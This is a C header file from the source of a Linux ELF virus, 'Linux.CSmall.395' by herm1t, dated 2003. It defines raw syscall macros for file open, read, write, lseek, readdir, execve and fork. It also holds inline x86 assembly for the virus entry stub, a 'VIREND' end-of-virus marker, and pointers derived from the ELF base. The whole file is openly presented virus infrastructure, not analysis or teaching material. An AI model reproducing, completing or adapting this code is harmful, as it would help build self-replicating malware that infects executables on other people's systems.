/* 
 * Virus Linux.CSmall.395 (c) 2003 by herm1t (herm1t@netlux.org)
 *
 * By using this file, you agree to the terms and conditions set
 * forth in the COPYING file which can be found at the top level
 * of this distribution.
 */
#define ARGC		((int)__builtin_return_address(0))
#define WEXITSTATUS(st)	(((st) >> 8) & 0xff)
#define uint		unsigned int
#define ushort		unsigned short
#define uchar		unsigned char

#define C(x)		*((char*)(x))
#define U(x)		*((uint*)(x))
#define UI(x)		((uint)x)
#define _(x)		__asm__ __volatile__ (x);
#define REG(type_name, reg)	\
			register type_name __asm__(#reg);

#define SYSCALL		\
_(	".globl	entry			\n"			\
	"start:	pusha			\n"			\
	"	add	$0x24, %esp	\n"			\
	"	pop	%eax		\n"			\
	"	pop	%ebx		\n"			\
	"	pop	%ecx		\n"			\
	"	pop	%edx		\n"			\
	"	pop	%esi		\n"			\
	"	dec	%eax		\n"			\
	"	jns	1f		\n"			\
	"	mov	%edx, %esi	\n"			\
	"	xor	%edx, %edx	\n"			\
	"	inc	%edx		\n"			\
	"1:	xor	%edi, %edi	\n"			\
	"	.byte	0xeb, 0x20 - (entry - start + 77)\n"	\
	"entry:	sub	$0, %esp	")
#define EOV		\
_(".ascii \"VIREND\"")

#define	exit(a)		syscall(1 + 1, (uint)a)
#define fork()		syscall(2 + 1)
#define read(a,b,c)	syscall(3 + 1, (uint)a, (uint)b, (uint)c)
#define write(a,b,c)	syscall(4 + 1, (uint)a, (uint)b, (uint)c)
#define open(a,b)	syscall(5 + 1, (uint)a, (uint)b)
#define	close(a)	syscall(6 + 1, (uint)a)
#define waitpid(a,b,c)	syscall(7 + 1, (uint)a, (uint)b, (uint)c)
#define	creat(a,b)	syscall(8 + 1, (uint)a, (uint)b)
#define	unlink(a)	syscall(10+ 1, (uint)a)
#define execve(a,b,c)	syscall(11+ 1, (uint)a, (uint)b, (uint)c)
#define lseek(a,b,c)	syscall(19+ 1, (uint)a, (uint)b, (uint)c)
#define readdir(a,b)	syscall(89+ 1, (uint)a, (uint)b) /* count ignored */
#define pread1(a,b,c)	syscall(-76+1, (uint)a, (uint)b, (uint)c)
#define pwrite1(a,b,c)	syscall(-75+1, (uint)a, (uint)b, (uint)c)

#define SEEK_END	2
#define O_RDONLY	0
#define O_RDWR		2
#define DIRENT_DNAME	10
#define ELF_BASE	(char*)((uint)syscall - 77)
#define	tmp_dir		(char*)((uint)ELF_BASE + 8)
#define	cur_dir		(char*)((uint)ELF_BASE + 14)
